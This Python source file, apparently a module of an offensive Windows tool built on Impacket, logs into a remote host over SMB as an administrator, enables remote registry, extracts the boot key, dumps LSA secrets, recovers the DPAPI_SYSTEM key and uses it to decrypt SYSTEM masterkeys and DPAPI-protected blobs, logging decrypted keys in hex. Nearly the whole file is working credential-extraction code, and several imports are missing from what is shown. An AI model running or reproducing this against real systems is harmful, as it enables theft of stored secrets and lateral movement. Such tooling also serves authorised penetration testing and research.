from lib.logger import logger


class DPAPI:
    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aesKey=None, debug=False, kdc=None, smb_instance=None):
        
        
        self.target = remoteName
        self.username = username
        self.password = password
        self.domain = domain
        self.doKerberos = kerberos or aesKey is not None
        self.no_pass = no_pass
        self.hashes = hashes
        self.aes = aesKey
        self.debug = debug
        self.kdc = kdc

        self.dpapiSystem = {}
        self.smb = smb_instance

        self.raw_masterkeys = {}
        self.masterkeys = {}

        self.share = 'C$'
        self.mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
        self.tid = self.smb.smb_conn.connectTree(self.share)

        self.bootKey = None
        self.remote_ops = None
        self.lsa_secrets = None 

    def triage_masterkey(self, mkid = None):
        
        try:
            # retrieve masterkey file contents
            logger.debug("[*] Retrieving masterkey file: " + mkid)
            self.raw_masterkeys[mkid] = self.smb.getFileContent(self.share, self.mk_path, mkid)
            
            # if we can't retrieve the masterkey file, we exit
            if self.raw_masterkeys[mkid] is None:
                logger.info(f"[!] Could not get content of masterkey file: {mkid}, exiting since we can't decrypt the blob.")
                self.smb.smb_conn.disconnectTree(self.tid)
                sys.exit(1)
            
            # if we can retrieve the masterkey file, then we proceed to extract the bootkey
            logger.debug("[*] Attempting to extract bootkey from the target machine")
            try:
                self.remote_ops = RemoteOperations(
                    self.smb.smb_conn, self.doKerberos, self.kdc)
                self.remote_ops.enableRegistry()
                self.bootKey = self.remote_ops.getBootKey()
            except Exception as e:
                logger.info('[!] RemoteOperations failed: %s' % str(e))
            
            
            # with the bootkey, we can now extract LSA Secrets
            logger.debug('[*] Attempting to dump LSA secrets from the target machine')
            try:
                SECURITYFileName = self.remote_ops.saveSECURITY()
                self.lsa_secrets = LSASecrets(SECURITYFileName, self.bootKey, self.remote_ops,
                                            isRemote=True, history=False,
                                            perSecretCallback=self.getDPAPI_SYSTEM)
                self.lsa_secrets.dumpSecrets()
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logger.info('[!] LSA hashes extraction failed: %s' % str(e))
            
            self.cleanup()          
            
            # debug, print SYSTEM user key
            # logger.debug(f"User Key: {self.dpapiSystem['UserKey']}")
            # logger.debug(f"Machine Key: {self.dpapiSystem['MachineKey']}")
            

            # now that we have the SYSTEM user key, we can decrypt the masterkey
            if self.dpapiSystem['UserKey'] is None:
                logger.info(
                    "[!] Could not retrieve the SYSTEM user key, exiting since we can't decrypt the blob.")
                self.smb.smb_conn.disconnectTree(self.tid)
                return
            for k, v in self.raw_masterkeys.items():
                if v is None:
                    self.masterkeys[k] = None
                    continue
                data = v
                mkf = MasterKeyFile(data)
                data = data[len(mkf):]
                if not mkf['MasterKeyLen'] > 0:
                    logger.info("[!] Masterkey file " + k +
                                " has no masterkeys, skipping.")
                    continue
                mk = MasterKey(data[:mkf['MasterKeyLen']])
                data = data[len(mk):]
                decrypted_key = mk.decrypt(self.dpapiSystem['UserKey'])
                if not decrypted_key:
                    logger.info("[!] Failed to decrypt masterkey " + k + ", skipping.")
                    continue
                logger.debug("[*] Decrypted masterkey " + k + ": 0x" + hexlify(decrypted_key).decode('utf-8'))
                self.masterkeys[k] = decrypted_key
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logger.info(e)
            try:
                self.cleanup()
            except:
                pass
        
        #self.cleanup()
        
        return

    def decrypt_blob(self, dpapi_blob=None) -> str:      

        # Identify the masterkey from the blob
        blob = DPAPI_BLOB(dpapi_blob)
        mkid = bin_to_string(blob['GuidMasterKey'])
        
        # If we don't have the masterkey, we triage it
        if mkid not in self.raw_masterkeys:
            self.triage_masterkey(mkid)
        
        key = self.masterkeys.get(mkid, None)
        if key is None:
            logger.info("[!] Could not decrypt masterkey " + mkid)
            return None
        
        
        decrypted = blob.decrypt(key)
        decoded_string = decrypted.decode('utf-16le').replace('\x00', '').replace('\\\\', '\\')
        

        return decoded_string

    def cleanup(self):
        if self.remote_ops:
            self.remote_ops.finish()
        if self.lsa_secrets:
            self.lsa_secrets.finish()

    def getDPAPI_SYSTEM(self,_, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            machineKey = machineKey.split(':')[1]
            userKey = userKey.split(':')[1]
            self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
            self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])


class SMB:
    def __init__(self, remoteName, username=None, password='', domain='', kerberos=False,
                 no_pass=False, hashes=None, aesKey=None, debug=False, kdc=None):

        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ""
        self.nthash = ""
        self.aesKey = aesKey
        self.target = remoteName
        self.kdcHost = kdc
        self.doKerberos = kerberos or aesKey is not None
        self.hashes = hashes
        self.no_pass = no_pass
        self.hashes = hashes

        self.smb_conn = None

        
        self.connect()
        self.is_admin()

    def connect(self) -> SMBConnection:
        try:
            logger.debug(f"[*] Establishing SMB connection to {self.target}")
            self.smb_conn = SMBConnection(self.target, self.target)
            if self.doKerberos:
                logger.debug("[*] Performing Kerberos login")
                self.smb_conn.kerberosLogin(self.username, self.password, self.domain, self.lmhash,
                                               self.nthash, self.aesKey, self.kdcHost)
            else:
                logger.debug("[*] Performing NTLM login")
                self.smb_conn.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
        except OSError as e:
            if str(e).find("Connection reset by peer") != -1:
                logger.info(f"SMBv1 might be disabled on {self.target}")
            if str(e).find('timed out') != -1:
                raise Exception(f"The connection is timed out. Port 445/TCP port is closed on {self.target}")
            return None
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') != -1:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled.')
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
                logging.debug(str(e))
        
        #logger.debug("[*] SMB Connection Established!")
        return self.smb_conn

    def disconnect(self):
        logger.debug(f"[*] Closing SMB connection to {self.target}")
        self.smb_conn.logoff()

    def is_admin(self) -> bool:
        try:
            self.smb_conn.connectTree('C$')
            return True
        except Exception:
            logger.info(f"[-] User {self.username} is not an admin on {self.target}")
            sys.exit(1)

    def getFileContent(self, share, path, filename) -> bytes:
        content = None
        try:
            fh = BytesIO()
            filepath = ntpath.join(path,filename)
            self.smb_conn.getFile(share, filepath, fh.write)
            content = fh.getvalue()
            fh.close()
        except:
            return None
        return content